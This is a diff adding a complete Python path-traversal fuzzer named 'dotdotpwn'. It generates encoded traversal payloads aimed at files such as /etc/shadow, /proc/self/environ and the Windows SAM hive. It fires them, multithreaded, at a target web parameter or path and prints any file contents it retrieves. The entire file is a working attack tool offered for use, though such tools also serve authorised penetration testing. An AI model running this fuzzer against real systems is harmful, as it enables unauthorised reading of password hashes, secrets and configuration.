@@ -1,0 +1,281 @@
+#!/usr/bin/env python3
+"""dotdotpwn - Directory traversal / path traversal fuzzer."""
+
+import sys
+import json
+import argparse
+import requests
+from urllib.parse import urlparse, urlencode, quote
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import warnings
+warnings.filterwarnings('ignore')
+
+# Traversal patterns
+TRAVERSAL_PATTERNS = [
+    # Basic traversals
+    '../', '..\\',
+    # URL encoded
+    '%2e%2e%2f', '%2e%2e/', '..%2f',
+    '%2e%2e%5c', '%2e%2e\\', '..%5c',
+    # Double URL encoded
+    '%252e%252e%252f', '%252e%252e/',
+    # Unicode / overlong
+    '..%c0%af', '..%c1%9c',
+    '%c0%ae%c0%ae%c0%af',
+    # Null byte
+    '../%00', '..\\%00',
+    # Mixed
+    '....//','....\\\\',
+    '....//', '....\\\\',
+    '..\\./', './..\\',
+]
+
+# Files to check for successful traversal
+TARGET_FILES = {
+    'linux': [
+        '/etc/passwd',
+        '/etc/shadow',
+        '/etc/hosts',
+        '/etc/hostname',
+        '/proc/self/environ',
+        '/proc/self/cmdline',
+        '/proc/version',
+        '/etc/issue',
+        '/etc/os-release',
+    ],
+    'windows': [
+        'C:\\Windows\\System32\\drivers\\etc\\hosts',
+        'C:\\Windows\\win.ini',
+        'C:\\Windows\\System32\\config\\SAM',
+        'C:\\boot.ini',
+        'C:\\inetpub\\logs\\LogFiles',
+    ],
+    'web': [
+        '/var/www/html/index.html',
+        '/var/www/html/index.php',
+        '/var/log/apache2/access.log',
+        '/var/log/apache2/error.log',
+        '/var/log/nginx/access.log',
+        '/var/log/nginx/error.log',
+        '/etc/apache2/apache2.conf',
+        '/etc/nginx/nginx.conf',
+    ],
+}
+
+# Indicators that traversal worked
+SUCCESS_INDICATORS = {
+    '/etc/passwd': ['root:', 'bin:', 'daemon:', 'nobody:'],
+    '/etc/shadow': ['root:', '$1$', '$5$', '$6$', '$2a$', '$2b$'],
+    '/etc/hosts': ['localhost', '127.0.0.1'],
+    '/etc/hostname': [],  # Any content means success
+    '/proc/version': ['Linux version'],
+    '/proc/self/environ': ['PATH=', 'HOME=', 'USER='],
+    'win.ini': ['[fonts]', '[extensions]', '[files]'],
+    'hosts': ['localhost', '127.0.0.1'],
+    'boot.ini': ['[boot loader]', '[operating systems]'],
+}
+
+
+def generate_payloads(depth, os_type='all'):
+    """Generate traversal payloads."""
+    payloads = []
+
+    target_files = []
+    if os_type in ('linux', 'all'):
+        target_files.extend(TARGET_FILES['linux'])
+        target_files.extend(TARGET_FILES['web'])
+    if os_type in ('windows', 'all'):
+        target_files.extend(TARGET_FILES['windows'])
+
+    for pattern in TRAVERSAL_PATTERNS:
+        for d in range(1, depth + 1):
+            traversal = pattern * d
+            for target in target_files:
+                # Normalize target path for the pattern
+                if '\\' in pattern:
+                    target = target.replace('/', '\\')
+                # Remove leading / for traversal
+                clean_target = target.lstrip('/').lstrip('\\')
+                payload = traversal + clean_target
+                payloads.append({
+                    'payload': payload,
+                    'target_file': target,
+                    'depth': d,
+                    'pattern': pattern,
+                })
+
+    return payloads
+
+
+def check_success(response_text, target_file):
+    """Check if traversal was successful."""
+    # Check for known indicators
+    for file_key, indicators in SUCCESS_INDICATORS.items():
+        if file_key in target_file:
+            if not indicators:
+                return len(response_text.strip()) > 0
+            return any(ind in response_text for ind in indicators)
+    return False
+
+
+def test_traversal(url, param, payload_info, method, headers, verify, baseline_length):
+    """Test a single traversal payload."""
+    payload = payload_info['payload']
+
+    try:
+        parsed = urlparse(url)
+        if method == 'GET':
+            # Replace parameter value
+            if param:
+                from urllib.parse import parse_qs
+                params = parse_qs(parsed.query, keep_blank_values=True)
+                params[param] = [payload]
+                test_url = parsed._replace(query=urlencode(params, doseq=True)).geturl()
+                resp = requests.get(test_url, headers=headers, timeout=10, verify=verify)
+            else:
+                # Append to path
+                test_url = url.rstrip('/') + '/' + quote(payload, safe='')
+                resp = requests.get(test_url, headers=headers, timeout=10, verify=verify)
+        else:
+            data = {param: payload} if param else {'file': payload}
+            resp = requests.post(url, data=data, headers=headers, timeout=10, verify=verify)
+            test_url = url
+
+        # Check for success
+        if resp.status_code == 200:
+            length_diff = abs(len(resp.text) - baseline_length)
+            if check_success(resp.text, payload_info['target_file']) or (length_diff > 100 and resp.status_code == 200):
+                return {
+                    'vulnerable': True,
+                    'payload': payload,
+                    'target_file': payload_info['target_file'],
+                    'depth': payload_info['depth'],
+                    'pattern': payload_info['pattern'],
+                    'url': test_url,
+                    'status': resp.status_code,
+                    'response_length': len(resp.text),
+                    'snippet': resp.text[:200],
+                }
+    except Exception:
+        pass
+
+    return None
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description='Directory traversal / path traversal fuzzer',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog='Examples:\n'
+               '  dotdotpwn -u "http://target.com/page?file=test.txt"\n'
+               '  dotdotpwn -u "http://target.com/download" -p file\n'
+               '  dotdotpwn -u "http://target.com/page?file=test" --os linux\n'
+               '  dotdotpwn -u "http://target.com/" --path-mode'
+    )
+    parser.add_argument('-u', '--url', required=True, help='Target URL')
+    parser.add_argument('-p', '--param', help='Parameter to test (auto-detect if URL has query)')
+    parser.add_argument('--depth', type=int, default=8, help='Traversal depth (default: 8)')
+    parser.add_argument('--os', choices=['linux', 'windows', 'all'], default='all',
+                        help='Target OS (default: all)')
+    parser.add_argument('--post', action='store_true', help='Use POST method')
+    parser.add_argument('--path-mode', action='store_true', help='Append traversal to URL path')
+    parser.add_argument('-t', '--threads', type=int, default=10, help='Threads (default: 10)')
+    parser.add_argument('-H', '--header', action='append', default=[], help='Custom header')
+    parser.add_argument('-k', '--insecure', action='store_true', help='Skip SSL verification')
+    parser.add_argument('-j', '--json', action='store_true', help='JSON output')
+    parser.add_argument('--stop-on-success', action='store_true', help='Stop after first finding')
+    args = parser.parse_args()
+
+    method = 'POST' if args.post else 'GET'
+    verify = not args.insecure
+
+    headers = {'User-Agent': 'dotdotpwn-hexstrike/1.0'}
+    for h in args.header:
+        key, _, value = h.partition(':')
+        headers[key.strip()] = value.strip()
+
+    # Determine parameter
+    param = args.param
+    if not param and not args.path_mode:
+        parsed = urlparse(args.url)
+        from urllib.parse import parse_qs
+        params = parse_qs(parsed.query, keep_blank_values=True)
+        if params:
+            # Test all params, start with likely ones
+            likely_params = ['file', 'path', 'page', 'dir', 'folder', 'doc', 'template',
+                             'include', 'filename', 'load', 'read', 'view', 'content', 'url']
+            for lp in likely_params:
+                if lp in params:
+                    param = lp
+                    break
+            if not param:
+                param = list(params.keys())[0]
+        else:
+            args.path_mode = True
+
+    # Get baseline
+    try:
+        resp = requests.get(args.url, headers=headers, timeout=10, verify=verify)
+        baseline_length = len(resp.text)
+    except Exception:
+        baseline_length = 0
+
+    # Generate payloads
+    payloads = generate_payloads(args.depth, args.os)
+    print(f"[*] Target: {args.url}")
+    print(f"[*] Parameter: {param or 'path mode'}")
+    print(f"[*] Payloads: {len(payloads)}")
+    print(f"[*] Depth: {args.depth}")
+
+    # Test
+    findings = []
+    tested = 0
+
+    with ThreadPoolExecutor(max_workers=args.threads) as executor:
+        futures = {
+            executor.submit(
+                test_traversal, args.url,
+                None if args.path_mode else param,
+                p, method, headers, verify, baseline_length
+            ): p for p in payloads
+        }
+
+        for future in as_completed(futures):
+            tested += 1
+            if tested % 50 == 0:
+                print(f"[*] Progress: {tested}/{len(payloads)}", end='\r')
+
+            result = future.result()
+            if result:
+                findings.append(result)
+                if not args.json:
+                    print(f"\n[+] VULNERABLE: {result['target_file']}")
+                    print(f"    Payload: {result['payload']}")
+                    print(f"    URL:     {result['url']}")
+                    print(f"    Snippet: {result['snippet'][:100]}...")
+
+                if args.stop_on_success:
+                    executor.shutdown(wait=False, cancel_futures=True)
+                    break
+
+    print(f"\n[*] Tested: {tested} payloads")
+    print(f"[*] Found: {len(findings)} vulnerabilities")
+
+    if args.json:
+        print(json.dumps({'url': args.url, 'findings': findings}, indent=2))
+    elif findings:
+        print(f"\n{'=' * 60}")
+        print(f"  PATH TRAVERSAL RESULTS")
+        print(f"{'=' * 60}")
+        seen_files = set()
+        for f in findings:
+            if f['target_file'] not in seen_files:
+                seen_files.add(f['target_file'])
+                print(f"\n  File: {f['target_file']}")
+                print(f"  Payload: {f['payload']}")
+                print(f"  Depth: {f['depth']}")
+                print(f"  Pattern: {repr(f['pattern'])}")
+
+
+if __name__ == '__main__':
+    main()
